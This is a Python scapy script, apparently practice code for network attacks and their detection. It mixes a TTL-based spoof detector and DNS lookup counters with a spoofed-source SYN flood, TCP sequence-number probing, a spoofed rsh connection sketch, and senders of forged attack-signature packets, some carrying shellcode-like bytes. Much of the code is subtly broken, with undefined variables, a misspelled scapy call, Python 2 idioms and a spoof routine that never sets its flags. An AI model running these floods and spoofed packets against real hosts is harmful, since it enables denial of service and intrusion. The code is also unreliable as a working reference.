#!/usr/bin/python3
from scapy.all import *
from IPy import IP as IPtest
def testTTL(pkt):
    try:
        if pkt.haslayer(IP):
            src_ip= pkt.getlayer(IP).src
            dest_ip= pkt.getlayer(IP).dst
            ttl = str(pkt.ttl)
            print("Packet recieved from: {} to {} with TTL: {}".format(src_ip,dest_ip,ttl))
            checkTTL(src_ip,ttl)
    except:
        pass

def checkTTL(source_ip,ttl):
    if IPtest(source_ip).iptype() == 'PRIVATE':
        return
    if not ttlValues.has_key(source_ip):
        pkt = srl(IP(dst=source_ip)/ICMP(),retry=0,timeout=1,verbose=0)
        ttlValues[source_ip] = pkt.ttl
    
    if abs(int(ttl)  - int(ttlValues[source_ip])) > THRESH:
        print("\n[!] Detected Possible Spoofed packet from: {}".format(source_ip))
        print ('[!] TTL: ' + ttl + ', Actual TTL: '+ str(ttlValues[ipsrc]))

def dnsRR(pkt):
    if pkt.haslayer(DNSRR):
        rrname = pkt.getlayer(DNSRR).rrname
        rdata = pkt.getlayer(DNSRR).rdata
        if dnsRecord.has_key(rrname):
            if rdata not in dnsRecord[rrname]:
                dnsRecord[rrname].append(rdata)
            else:
                dnsRecord[rrname] = []
                dnsRecord[rrname].append(rdata)

def dnsQR(packet):
    if packet.haslayer(DNSQR) and packet.getlayer(UDP).sport == 53:
        rcode = packet.getlayer(DNS).rcode
        qname = packet.getlayer(DNSQR).qname
        if rcode == 3:
            print("Named Request Lookup Failed: {}".format(qname))
            return True
        else:
            return False

def synFlood(src,target):
    for src_port in range(1024,65535):
        IPlayer = IP(src=src,dst=target)
        TCPlayer = TCP(sport = src_port,dport=80)
        pkt = IPlayer/TCPlayer
        send(pkt)

def call_TCP_Sequence_Number(target):
    seqNum = 0
    preNum = 0
    diffSeq = 0
    for x in range(1,5):
        if preNum != 0 :
            preNum = seqNum
        pkt = IP(dst=target)/TCP()
        ans = sr1(pkt,verbose=0)
        seqNum =  ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print('[+] TCP Seq Difference: ' + str(diffSeq))

    return diffSeq + seqNum


def spoofConn(src,target,seqNum):
    IPlayer1 = IP(src=src,dst=target)
    TCPlayer1 = TCP(sport = 513,dport = 514)
    synPkt = IPlayer1 / TCPlayer1
    send(synPkt)

    IPlayer2 = IP(src=src,dst=target)
    TCPlayer2 = TCP(sport=513,dport=514)
    ackPkt = IPlayer2 / TCPlayer2
    send(ackPkt)

def ddosTest(src,target,iface,count):
    pkt = IP(src,target) / ICMP(type=8,id=678) / Raw(load='1234')
    send(pkt,iface=iface,count=count)
    pkt = IP(src,target) / ICMP(type=0) / Raw(load='AAAAAAAA')
    send(pkt,iface=iface,count=count)
    pkt = IP(src,target) / UDP(dport=31335) / Raw(load='1234')
    send(pkt,iface=iface,count=count)
    pkt = IP(src,target) / ICMP(type=0,id=456)
    send(pkt,iface=iface,count=count)

def exploitTest(src,target,iface,count):
    pkt = IP(src,target) / UDP(dport= 635) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt,iface=iface,count=count)
    pkt = IP(src=src, dst=dst) / UDP(dport=635)/Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)

def scanTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=7) /Raw(load='cybercop')
    send(pkt)
    pkt = IP(src=src, dst=dst) / UDP(dport=10080) /Raw(load='Amanda')
    send(pkt, iface=iface, count=count)


if __name__ == "__main__":
    THRESH = 5
    ttlValues = {}
    dnsRecord = {}
    un_ans_req = 0
    # sniff(prn=testTTL,store=0)
    # pkts = rdpcap("test.pcap")
    # for pkt in pkts:
    #     dnsRR(pkt)
    
    # for item in dnsRecord:
    #     print("[+] {} has {} unique IPs".format(item,str(len(dnsRecord[item]))))
    # pkts = rdpcap('test.pcap')
    # for pkt in pkts:
    #     if dnsQR(pkt):
    #         un_ans_req += 1
    # print("[!] {} Total unAnswered Name Requests".format(str(un_ans_req)))
    # src = "192.168.1.13"
    # tgt = "192.168.1.1"
    # synFlood(src,tgt)
    # diffseq = call_TCP_Sequence_Number('192.168.1.11')
    # src = '168.168.1.13'
    # dst = '192.168.0.11'
    # spoofConn(src,dst,diffseq)

    # src = '191.168.1.11'
    # target = '191.168.1.13'
    # iface = 'wlan0'
    # count 1
    # ddosTest(src,target,iface,count)
